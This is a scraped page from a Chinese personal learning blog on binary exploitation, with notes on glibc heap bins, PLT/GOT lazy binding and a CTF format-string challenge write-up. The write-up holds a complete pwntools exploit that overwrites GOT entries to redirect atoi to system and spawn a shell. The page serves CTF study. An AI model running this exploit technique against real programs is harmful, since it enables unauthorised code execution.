各种bin​	fast bin、tcache bin按照LIFO(last in first out)单链表组织，采用头插法
​	unsorted bin、small bin按照FIFO(first in first out)双链表组织，采用头插法
​	large bin按照双链表组织，插入节点时会保证size从大到小排序
https://blog.51cto.com/u_15076233/3914352
​		有两种结构来管理,一种是fastbin的,另外一种是其他三种bin的
&#x2F;* Fastbins *&#x2F; 用来管理小的chunk​		mfastbinptr fastbinsY[NFASTBINS];
&#x2F;* Normal bins packed as described above *&#x2F;​		mchunkptr bins[NBINS * 2 - 2];
​		• bins：能够存放所有size范围的free chunk，共127个链表节点项，每个链表长度不限。
​		• bin[0]为unsorted bin  存放未整理的chunk
​		• bin[2] ~ bin[63]为small bin 管理中等大小的chunk
​		• bin[64] ~ bin[127]为large bin  存放较大的chunk
fastbin​		将小chunk单独管理(0x20 - 0x80,以0x10为单位,共7个),fd指向它前面那一个 (64位)
​		使用顺序: 先进后出 ,或者说,后进,先出, 头插! 
​		靠近fastbinY[]的是头部
​		释放的时候并不会把p标志置为0
​		

https://kiprey.github.io/2020/04/heap-3-bins/
堆命令: vis fastbin
how2heap 2.23 fastbin的例子https://github.com/shellphish/how2heap/blob/master/glibc_2.23/fastbin_dup.c
分配完三个0x8大小的堆块后的堆布局,这里有几个细节需要注意.
1.对齐问题,因为要进行16字节对齐,所以哪怕是分配了8字节,也会给一个16字节的空间,头部是16字节,所以一共32字节
Malloc(16)也是这样的,malloc(24呢) 也是一样的, 是因为会复用下一个chunk的prev_size吗? 那不复用不就不够了
这个size是包含了头部的
那岂不是如果malloc24的话,正好的空间,malloc16的话,会多了8字节可用的空间

后进先出,后面进来的会被挂到头部,可以修改一下代码,释放abc看一下,c是0,b是1,a是2

unsorted bin​		(除了fastbin外) 被释放的chunk以及把大的chunk分割出来的剩下的chunk,都会先放进这里,目的主要是能让malloc有二次利用最近释放的chunk的机会
​		unsorted bin只有一个,位于bin[1]中 ???? 
​		无序双向链表,FIFO, 链头插入chunk,链尾取出?? 不对吧 对的,看图,左边是插入,右边是取出
​		unsorted bin 本身是什么呢? 在哪里?
​		释放的时候会合并? 什么情况下, 相邻的会合并,(还有其他条件吗?)
unsortedbinall: 0x5555557591c0 —▸ 0x555555759000 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x5555557591c0
unsortedbinall: 0x555555759380 —▸ 0x5555557591c0 —▸ 0x555555759000 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x555555759380
左右箭头应该是 fd和bk的意思( 左箭头是值的意思吧)

small bin​		bin[2] ~ bin[63]为small bin, 管理大小为[0x20, 0x400]的 free chunk,(64位)
​		small bins 中每个 chunk 的大小与其所在的 bin 的 index 的关系为：chunk_size &#x3D; 2 * SIZE_SZ *index，具体如下


​		16-504B 0x10-0x200
​		32-1008B 0x20-0x400
​		索引为2中chunk大小为0x20 - 0x30​		索引为3里的chunk大小为0x30 - 0x40​		......​		索引为63里的chunk大小为0x3F0 - 0x400

large bin​		bin[64] ~ bin[126]为large bin  存放较大的chunk
​		large bin 大体上分为6大组，其中每个大组里都有若干小组
​		large bins 中一共包括 63 个 bin，每个 bin 中的 chunk 的大小不一致，而是处于一定区间范围内。此外，这 63 个 bin 被分成了 6 组，每组 bin 中的 chunk 大小之间的公差一致，具体如下：



tcachebin2.26开始
malloc和free流程raw.githubusercontent.com&#x2F;cloudburst&#x2F;libheap&#x2F;master&#x2F;heap.png
mallocmalloc的具体实现可以查看malloc.c中_int_malloc函数，大致流程如下：
1.将大小按规则对齐，得到实际要分配的大小size
2.检查size是否符合tcache bin的大小。如果是，检查对应size的entry是否有free chunk。如果有，则分配返回
3.检查size是否符合fast bin的大小。如果是，检查对应size的entry是否有free chunk。如果有，则分配返回
4.循环遍历unsorted bin，寻找可用的free chunk
​	•  如果遍历到的free chunk size正好和所需size相等，则分配返回
​	•  如果遍历到的free chunk size和所需size不等，则将其从双链表中解链(unlink)，插入到对应大小的bins中
5.根据size，以best-fit的方式，找到相应的small bin或者large bin
​	• 对于small bin，如果size正好合适，那么unlink之后，直接将该chunk返回给用户；否则进行切割，剩下的部分重新插入到unsorted bin中。
​	• 对于large bin，由于一个bin通常对应几个size，那么根据fd_nextsize的顺序，以size从大到小的顺序遍历chunk，同样采取best-fit的方式寻找合适的chunk，后续行为与small bin类似。
6.使用top chunk，将top chunk进行切割：
• 如果top chunk size足够，则将切割下来的部分返回，剩下的部分继续作为top chunk
• 如果top chunk size不够，则需要通过sysmalloc申请更多的堆空间
freefree的具体实现可以查看malloc.c中_int_free函数，大致流程如下：

如果free chunk的size属于tcache范围内，且对应大小的tcache bin没有满，则插入到相应的

tcache bin中去

如果free chunk的size属于fast bin范围内，且对应大小的tcache bin满了，则插入到fastbin

中去

如果上述条件均不满足，则通过该chunk的prev_inuse标志位检查是否可以前后向合并：

• 如果可以合并，则将需要被合并的chunk先unlink下来，合并成一个更大的chunk后再插入到
unsorted bin中（或合并到top chunk里面）
• 如果不可以合并，则将该chunk直接插入到unsorted bin中

free chunk是mmap的chunk，那么调用munmap直接返回给系统

参考资料ctf-wiki
datacon训练营
</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/pwn%E5%85%A5%E9%97%A8-12-pltgot%E5%8F%8A%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/" title="pwn入门-12-pltgot延迟绑定及符号解析">pwn入门-12-pltgot延迟绑定及符号解析</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-02-28T10:22:14.000Z" title="发表于 2023-02-28 18:22:14">2023-02-28</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-07-11T05:57:59.508Z" title="更新于 2023-07-11 13:57:59">2023-07-11</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/PWN/">PWN</a></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/PWN%E5%85%A5%E9%97%A8/">PWN入门</a></span></div><div class="content">​		2023.7.8更新:很早之前已经写了这篇博客,但是只学了一点皮毛..只在表面,后面学到了ret2dlresolve漏洞发现需要理解这部分东西,又回炉重造,添加了需要学习的更细致的知识
符号解析基础知识参考ctfwiki(wiki中是倒推的,感觉理解起来不如正推)
​		在 ELF 文件中，对于每一个需要重定位的 ELF 节都有对应的重定位表，比如说 .text 节如果需要重定位，那么其对应的重定位表为 .rel.text。 所以.rel.plt就是plt节需要重定位所产生的节了.
​		.rel.plt中就会包含一个指向这个符号的重定位表项. r_offset给出了要修改的位置,r_info给出了要修改的符号的符号表索引,所以r_info索引到了 .dynsym
​		.dynsym中,st_name保存着动态符号在dynstr中的偏移
​		.dynstr又是怎么来的呢? 答:当一个程序导入某个函数时,.dynstr就会包含对应函数名称的字符串(最后是根据这个字符串名字来进行解析的!!!)

以       ret2dl中的例子来说,可以用readelf查看这些节(但在ida中不会显示的这么全,会放到LOAD段里)
1234567891011121314151617181920212223242526272829303132333435363738394041root@vultr:~/ret2dl# readelf -S main_partial_relro_32There are 31 section headers, starting at offset 0x3848:Section Headers:  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al  [ 0]                   NULL            00000000 000000 000000 00      0   0  0  [ 1] .interp           PROGBITS        080481b4 0001b4 000013 00   A  0   0  1  [ 2] .note.gnu.build-i NOTE            080481c8 0001c8 000024 00   A  0   0  4  [ 3] .note.gnu.propert NOTE            080481ec 0001ec 00001c 00   A  0   0  4  [ 4] .note.ABI-tag     NOTE            08048208 000208 000020 00   A  0   0  4  [ 5] .gnu.hash         GNU_HASH        08048228 000228 000020 04   A  6   0  4  [ 6] .dynsym           DYNSYM          08048248 000248 0000a0 10   A  7   1  4  [ 7] .dynstr           STRTAB          080482e8 0002e8 00006b 00   A  0   0  1  [ 8] .gnu.version      VERSYM          08048354 000354 000014 02   A  6   0  2  [ 9] .gnu.version_r    VERNEED         08048368 000368 000020 00   A  7   1  4  [10] .rel.dyn          REL             08048388 000388 000018 08   A  6   0  4  [11] .rel.plt          REL             080483a0 0003a0 000028 08  AI  6  24  4  [12] .init             PROGBITS        08049000 001000 000024 00  AX  0   0  4  [13] .plt              PROGBITS        08049030 001030 000060 04  AX  0   0 16  [14] .plt.sec          PROGBITS        08049090 001090 000050 10  AX  0   0 16  [15] .text             PROGBITS        080490e0 0010e0 000289 00  AX  0   0 16  [16] .fini             PROGBITS        0804936c 00136c 000018 00  AX  0   0  4  [17] .rodata           PROGBITS        0804a000 002000 000008 00   A  0   0  4  [18] .eh_frame_hdr     PROGBITS        0804a008 002008 000054 00   A  0   0  4  [19] .eh_frame         PROGBITS        0804a05c 00205c 000150 00   A  0   0  4  [20] .init_array       INIT_ARRAY      0804bf04 002f04 000004 04  WA  0   0  4  [21] .fini_array       FINI_ARRAY      0804bf08 002f08 000004 04  WA  0   0  4  [22] .dynamic          DYNAMIC         0804bf0c 002f0c 0000e8 08  WA  7   0  4  [23] .got              PROGBITS        0804bff4 002ff4 00000c 04  WA  0   0  4  [24] .got.plt          PROGBITS        0804c000 003000 000020 04  WA  0   0  4  [25] .data             PROGBITS        0804c020 003020 000008 00  WA  0   0  4  [26] .bss              NOBITS          0804c028 003028 000004 00  WA  0   0  1  [27] .comment          PROGBITS        00000000 003028 00002b 01  MS  0   0  1  [28] .symtab           SYMTAB          00000000 003054 000480 10     29  45  4  [29] .strtab           STRTAB          00000000 0034d4 000254 00      0   0  1  [30] .shstrtab         STRTAB          00000000 003728 00011d 00      0   0  1Key to Flags:  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),  L (link order), O (extra OS processing required), G (group), T (TLS),  C (compressed), x (unknown), o (OS specific), E (exclude),  p (processor specific)

.rel.plt​		.rel.dyn是动态链接的二进制文件中需要重定位的变量的信息,.rel.plt是需要重定位的函数的信息
​		它的结构如下(以32位为例),两种类型区别见wiki
12345678910typedef struct &#123;    Elf32_Addr        r_offset;    Elf32_Word       r_info;&#125; Elf32_Rel;typedef struct &#123;    Elf32_Addr     r_offset;    Elf32_Word    r_info;    Elf32_Sword    r_addend;&#125; Elf32_Rela;


​		最重要的就是前两个字段,r_offset,给出了需要重定位的位置,对于可执行文件而言,取值是需要重定位的虚拟地址,一般而言也就是GOT表的地址

​		GOT表中开始存放的值是这个

​		这玩意也就是plt表,要进行真正解析的地方

​		r_info给出需要重定位的符号的符号表索引,以及相应的重定位类型. 换句话说,第一个参数是告诉你要把哪里的值进行修改,这个参数是告诉你,要修改哪个符号.

高三个字节对应的值表示这个动态符号在.dynsym符号表中的位置
最低字节表示的是重定位类型

.dynsym​		结构如下
123456789typedef struct&#123;  Elf32_Word    st_name;   /* Symbol name (string tbl index) */  Elf32_Addr    st_value;  /* Symbol value */  Elf32_Word    st_size;   /* Symbol size */  unsigned char st_info;   /* Symbol type and binding */  unsigned char st_other;  /* Symbol visibility under glibc&gt;=2.2 */  Elf32_Section st_shndx;  /* Section index */&#125; Elf32_Sym;

​		这个在ida中也是没有直接给出的,可以用readelf查看然后寻找.
​		其中比较重要的字段

st_name 保存着动态符号在.dynstr表(动态字符串表)中的偏移
st_value 如果这个符号被导出,这个符号保存着对应的虚拟地址


1Elf32_Sym &lt;offset aRead - offset unk_80482E8, 0, 0, 12h, 0, 0&gt; ; &quot;read&quot;

​		以read为例,aRead是这个符号的虚拟地址, 减去符号表开始的虚拟地址,就得到了偏移, read的这个值为0x27
0x804830F - 0x80482E8 &#x3D; 0x27,也就是read这个字符串开始的地方,(以及他们每个字符串结束后都有个0,位置结束符号)
​		dynstr表如下

.dynmaic
解析过程got plt .got.plt 延迟绑定got表 got.plt表​		Globle offset table全局偏移量表，位于数据段，是一个每个条目是8字节地址的数组，用来存储外部函数在内存的确切地址，GOT表存储在数据段，（在IDA中是也就是.data段）可以在程序运行中被修改。
​		.got 存放全局变量引用
​		.got.plt 存放需要延迟绑定的函数
​		got表的初始状态指向一段plt,首次调用时会由plt表中指令进行解析,得到真正的函数地址(即内存中的地址)并填入相应的got表项


plt表
https://blog.csdn.net/qq_52126646/article/details/119494939
延迟绑定​		以上一篇博客的题目为例
​		call一个函数的时候,先到plt     0x400650 &lt;system@plt&gt;
12pwndbg&gt; p system$2 = &#123;&lt;text variable, no debug info&gt;&#125; 0x400650 &lt;system@plt&gt;



​		然后plt里面第一条 jmp     cs:off_600D38 这里会跳到 system@got的地址,(此时还没有初始化)
​		display &#x2F;3i $rip 设置单步执行后自动显示的内容,这里显示后续三条指令
12345pwndbg&gt; display /3i $rip2: x/3i $rip=&gt; 0x400650 &lt;system@plt&gt;:	jmp    QWORD PTR [rip+0x2006e2]        # 0x600d38   0x400656 &lt;system@plt+6&gt;:	push   0x2   0x40065b &lt;system@plt+11&gt;:	jmp    0x40062



​		之后,0x600d38里面的地址是system@plt刚才jmp的下一条,push 0x2,然后再jmp 0x40062,也就是PLT[0],跳转到动态链接器进行地址解析.找到真正的地址,填入got地址,也就是0x600d38,
1234567891011121314pwndbg&gt; x/20wx 0x600d380x600d38:	0x00400656	0x00000000	0xf7a46e40	0x00007fff0x600d48:	0xf7a46f10	0x00007fff	0xf7af2020	0x00007fff.plt:0000000000400650 ; int system(const char *command).plt:0000000000400650 _system         proc near               ; CODE XREF: main+DE↓p.plt:0000000000400650                 jmp     cs:off_600D38.plt:0000000000400650 _system         endp.plt:0000000000400650.plt:0000000000400656 ; ---------------------------------------------------------------------------.plt:0000000000400656                 push    2.plt:000000000040065B                 jmp     sub_400620  



​		下次在执行的时候,直接就plt-&gt;got的第一个jmp -&gt; 实际地址,也就是说0x600d38里存储的是system的真实内存地址了
12345678910pwndbg&gt; x/20wx 0x600d380x600d38:	0xf7a31420	0x00007fff	0xf7a46e40	0x00007fff0x600d48:	0xf7a46f10	0x00007fff	0xf7af2020	0x00007fff    pwndbg&gt; x/20wx 0x00007ffff7a314200x7ffff7a31420 &lt;__libc_system&gt;:	0x74ff8548	0xfa66e90b	0x0f66ffff	0x0000441f0x7ffff7a31430 &lt;__libc_system+16&gt;:	0x593d8d48	0x48001649	0xe808ec83	0xfffffa500x7ffff7a31440 &lt;__libc_system+32&gt;:	0x940fc085	0xc48348c0	0xc0b60f08	0x001f0fc30x7ffff7a31450 &lt;__GI___realpath&gt;:	0xe5894855	0x56415741	0x54415541	0xec814853





</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/pwn%E5%85%A5%E9%97%A8-11-2%E6%9C%88%E6%9C%88%E8%B5%9B%E9%A2%98%E5%8F%8A%E5%8F%8D%E6%80%9D/" title="pwn入门-11-2月月赛题及反思">pwn入门-11-2月月赛题及反思</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-02-26T01:56:50.000Z" title="发表于 2023-02-26 09:56:50">2023-02-26</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-06-09T12:27:33.286Z" title="更新于 2023-06-09 20:27:33">2023-06-09</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/PWN/">PWN</a></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/PWN%E5%85%A5%E9%97%A8/">PWN入门</a></span></div><div class="content">​		2.25号月赛,只有一道pwn题,格式化字符串,其实本身抱着一种相对良好的心态,觉得自己学了一段时间了,前段时间刚看的格式化字符串,应该没什么问题………但还是寄了,其他方向队友都做出来了,就只剩自己这一道pwn题了…感觉比较受打击……
​		在做题的时候,漏洞点很明显,关于如何利用,自己想了很多很多,越想越复杂,越搞心态越崩.结束后看了下exp,其实比自己想的简单多的多.
​		总结一下,问题有好几个,一个是调试程序不熟练,浪费很多时间,最重要的一个问题还是基础不牢,有些点想不到或者模棱两可,逻辑链连不上,就很容易想复杂,不确定可不可以,就导致了自己很犹豫要不要尝试一下这种攻击手法
​		这道题其实就是替换函数地址的事,主要是要搞清楚plt,got的关系以及延迟绑定就可以了.
​		题目链接:https://tangzichengcc.github.io/2023/02/26/pwn入门-11-2月月赛题及反思/ezfmt
​		exp如下
123456789101112131415161718192021222324252627from pwn import *context.log_level=&#x27;debug&#x27;context.arch=&#x27;amd64&#x27;context.terminal=[&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]p=process(&#x27;./ezfmt&#x27;)p.sendlineafter(&#x27;Choice:&#x27;,&#x27;2&#x27;)#gdb.attach(p,&#x27;b *0x04008E1&#x27;)#payload=&#x27;aaaaaaaa&#x27;+&#x27;%6$p&#x27;#system plt -&gt;main#atoi -&gt; system gotsystem_got=0x000000000600D38again=0x00000000004007B7  #选择 atoi_got=0x600D70system_plt=0x400656payload=fmtstr_payload(6,&#123;system_got:again,atoi_got:system_plt&#125;)p.sendline(payload)p.sendline(&#x27;/bin/sh\x00&#x27;)p.interactive()



​		1.替换的是.got.plt里的地址 , 替换成的again就是.text段sub_4007B7的地址,这样的话,就可以劫持控制流,再次回来.
​		意思就是call system的时候先去plt,然后进got.plt里的地址,就直接执行4007b7的指令了,没问题
​		2.同时把获取选择参数的函数atoi换成system(这里为什么又是plt了呢? 因为system的got表里地址还没有初始化,而且被替换了,那就只能是plt,如果初始化了呢? 调用应该也没问题,都是一样的代码,)
​		atoi的got地址,换成system的plt地址的话, call atoi –&gt; atoi的plt–&gt;atoi的got –&gt; system的plt –&gt; system的got(注意,这里不一样了,这里不是got的第一条指令,如果是的话,就还是跳到我们第一步覆盖的again那里了,覆盖的是下一条,就是push,然后jump到dl_runtime_resolve初始化那里) plt具体内容等下一篇博客写吧,正常来说,400650才是它的开头,但不能跳到这里,不然就到again了下一条就可以了
12345678.plt:0000000000400650 ; int system(const char *command).plt:0000000000400650 _system         proc near               ; CODE XREF: main+DE↓p.plt:0000000000400650                 jmp     cs:off_600D38.plt:0000000000400650 _system         endp.plt:0000000000400650.plt:0000000000400656 ; ---------------------------------------------------------------------------.plt:0000000000400656                 push    2.plt:000000000040065B                 jmp     sub_400620



​		注意最后要再给它输入一个&#x2F;bin&#x2F;sh, \x00好像无所谓的
​		context.arch&#x3D;’amd64’ 如果不加的话也会有问题,为啥呢……….?
​		如何进行 调试呢??? 可以看看xuanxuan那个博客
</div></div></div><nav id="pagination"><div class="pagination"><a class="extend prev" rel="prev" href="/page/5/#content-inner"><i class="fas fa-chevron-left fa-fw"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/#content-inner">5</a><span class="page-number current">6</span><a class="page-number" href="/page/7/#content-inner">7</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/#content-inner">9</a><a class="extend next" rel="next" href="/page/7/#content-inner"><i class="fas fa-chevron-right fa-fw"></i></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/profile.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">唐仔橙</div><div class="author-info__description">喜欢探索世界,在读研究生,计算机爱好者的成长记录</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">82</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">15</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">13</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/tangzichengcc"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/tangzichengcc" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">会记录自己的学习经历,以及一些经历,如果有想法或者疑惑,欢迎交流!!</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/pwn%E5%85%A5%E9%97%A8-49-pwnable%E4%B9%8Bseethefile/" title="pwn入门-49-pwnable之seethefile"><img src="/img/background/10.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="pwn入门-49-pwnable之seethefile"/></a><div class="content"><a class="title" href="/pwn%E5%85%A5%E9%97%A8-49-pwnable%E4%B9%8Bseethefile/" title="pwn入门-49-pwnable之seethefile">pwn入门-49-pwnable之seethefile</a><time datetime="2024-01-28T14:31:00.000Z" title="发表于 2024-01-28 22:31:00">2024-01-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/pwn%E5%85%A5%E9%97%A8-48-setcontext%E5%BA%94%E7%94%A8/" title="pwn入门-48-setcontext应用"><img src="/img/background/8.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="pwn入门-48-setcontext应用"/></a><div class="content"><a class="title" href="/pwn%E5%85%A5%E9%97%A8-48-setcontext%E5%BA%94%E7%94%A8/" title="pwn入门-48-setcontext应用">pwn入门-48-setcontext应用</a><time datetime="2024-01-27T15:28:41.000Z" title="发表于 2024-01-27 23:28:41">2024-01-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/pwn%E5%85%A5%E9%97%A8-47-zh3R0CTF2021-moreprintf/" title="pwn入门-47-zh3R0CTF2021-moreprintf"><img src="/img/background/15.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="pwn入门-47-zh3R0CTF2021-moreprintf"/></a><div class="content"><a class="title" href="/pwn%E5%85%A5%E9%97%A8-47-zh3R0CTF2021-moreprintf/" title="pwn入门-47-zh3R0CTF2021-moreprintf">pwn入门-47-zh3R0CTF2021-moreprintf</a><time datetime="2023-11-12T15:40:29.000Z" title="发表于 2023-11-12 23:40:29">2023-11-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/c%E8%AF%AD%E8%A8%80%E5%9B%9E%E7%82%89%E9%87%8D%E9%80%A0-unix%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3/" title="c语言回炉重造-unix系统接口"><img src="/img/background/12.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="c语言回炉重造-unix系统接口"/></a><div class="content"><a class="title" href="/c%E8%AF%AD%E8%A8%80%E5%9B%9E%E7%82%89%E9%87%8D%E9%80%A0-unix%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3/" title="c语言回炉重造-unix系统接口">c语言回炉重造-unix系统接口</a><time datetime="2023-11-12T07:29:52.000Z" title="发表于 2023-11-12 15:29:52">2023-11-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/pwn%E5%85%A5%E9%97%A8-46-glibc%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95/" title="pwn入门-46-glibc源码调试"><img src="/img/background/16.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="pwn入门-46-glibc源码调试"/></a><div class="content"><a class="title" href="/pwn%E5%85%A5%E9%97%A8-46-glibc%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95/" title="pwn入门-46-glibc源码调试">pwn入门-46-glibc源码调试</a><time datetime="2023-11-06T13:01:36.000Z" title="发表于 2023-11-06 21:01:36">2023-11-06</time></div></div></div></div><div class="card-widget card-categories"><div class="item-headline">
            <i class="fas fa-folder-open"></i>
            <span>分类</span>
            <a class="card-more-btn" href="/categories/" title="查看更多">
    <i class="fas fa-angle-right"></i></a>
            </div>
            <ul class="card-category-list" id="aside-cat-list">
            <li class="card-category-list-item "><a class="card-category-list-link" href="/categories/FUZZ/"><span class="card-category-list-name">FUZZ</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/IOT/"><span class="card-category-list-name">IOT</span><span class="card-category-list-count">3</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/PWN/"><span class="card-category-list-name">PWN</span><span class="card-category-list-count">53</span></a><ul class="card-category-list child"><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/PWN/%E8%99%9A%E6%8B%9F%E5%8C%96/"><span class="card-category-list-name">虚拟化</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/PWN/%E8%B0%83%E8%AF%95/"><span class="card-category-list-name">调试</span><span class="card-category-list-count">1</span></a></li></ul></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"><span class="card-category-list-name">漏洞复现</span><span class="card-category-list-count">2</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E7%94%9F%E6%B4%BB/"><span class="card-category-list-name">生活</span><span class="card-category-list-count">2</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E7%A7%91%E7%A0%94-%E5%B9%B6%E6%B2%A1%E6%9C%89/"><span class="card-category-list-name">科研(并没有)</span><span class="card-category-list-count">1</span></a></li>
            </ul></div><div class="card-widget card-tags"><div class="item-headline"><i class="fas fa-tags"></i><span>标签</span></div><div class="card-tag-cloud"><a href="/tags/%E6%97%85%E6%B8%B8/" style="font-size: 1.15em; color: rgb(7, 167, 108)">旅游</a><a href="/tags/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8/" style="font-size: 1.15em; color: rgb(73, 30, 182)">浏览器安全</a><a href="/tags/%E8%B7%AF%E7%94%B1%E5%99%A8/" style="font-size: 1.3em; color: rgb(151, 97, 158)">路由器</a><a href="/tags/csapp/" style="font-size: 1.15em; color: rgb(53, 192, 39)">csapp</a><a href="/tags/C%E8%AF%AD%E8%A8%80/" style="font-size: 1.3em; color: rgb(152, 6, 123)">C语言</a><a href="/tags/PWN%E5%85%A5%E9%97%A8/" style="font-size: 1.45em; color: rgb(35, 73, 116)">PWN入门</a><a href="/tags/%E5%A0%86/" style="font-size: 1.15em; color: rgb(96, 131, 92)">堆</a><a href="/tags/docker/" style="font-size: 1.15em; color: rgb(9, 68, 171)">docker</a><a href="/tags/%E8%84%9A%E6%9C%AC/" style="font-size: 1.15em; color: rgb(0, 15, 196)">脚本</a><a href="/tags/%E7%A0%94%E7%A9%B6%E7%94%9F%E8%AF%BE%E7%A8%8B/" style="font-size: 1.38em; color: rgb(73, 24, 26)">研究生课程</a><a href="/tags/%E8%AF%97%E6%AD%8C/" style="font-size: 1.15em; color: rgb(33, 197, 192)">诗歌</a><a href="/tags/%E8%B0%83%E8%AF%95/" style="font-size: 1.15em; color: rgb(66, 123, 47)">调试</a><a href="/tags/%E8%AE%BA%E6%96%87/" style="font-size: 1.15em; color: rgb(118, 151, 29)">论文</a><a href="/tags/KVM/" style="font-size: 1.22em; color: rgb(116, 39, 80)">KVM</a><a href="/tags/USENIX/" style="font-size: 1.15em; color: rgb(85, 135, 97)">USENIX</a></div></div><div class="card-widget card-archives"><div class="item-headline"><i class="fas fa-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
    <i class="fas fa-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/01/"><span class="card-archive-list-date">一月 2024</span><span class="card-archive-list-count">2</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/11/"><span class="card-archive-list-date">十一月 2023</span><span class="card-archive-list-count">3</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/10/"><span class="card-archive-list-date">十月 2023</span><span class="card-archive-list-count">6</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/09/"><span class="card-archive-list-date">九月 2023</span><span class="card-archive-list-count">7</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/08/"><span class="card-archive-list-date">八月 2023</span><span class="card-archive-list-count">3</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/07/"><span class="card-archive-list-date">七月 2023</span><span class="card-archive-list-count">3</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/06/"><span class="card-archive-list-date">六月 2023</span><span class="card-archive-list-count">8</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/05/"><span class="card-archive-list-date">五月 2023</span><span class="card-archive-list-count">7</span></a></li></ul></div><div class="card-widget card-webinfo"><div class="item-headline"><i class="fas fa-chart-line"></i><span>网站资讯</span></div><div class="webinfo"><div class="webinfo-item"><div class="item-name">文章数目 :</div><div class="item-count">82</div></div><div class="webinfo-item"><div class="item-name">已运行时间 :</div><div class="item-count" id="runtimeshow" data-publishDate="2022-10-02T16:00:00.000Z"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">本站访客数 :</div><div class="item-count" id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">本站总访问量 :</div><div class="item-count" id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">最后更新时间 :</div><div class="item-count" id="last-push-date" data-lastPushDate="2024-01-30T10:28:48.234Z"><i class="fa-solid fa-spinner fa-spin"></i></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2022 - 2024 By 唐仔橙</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div 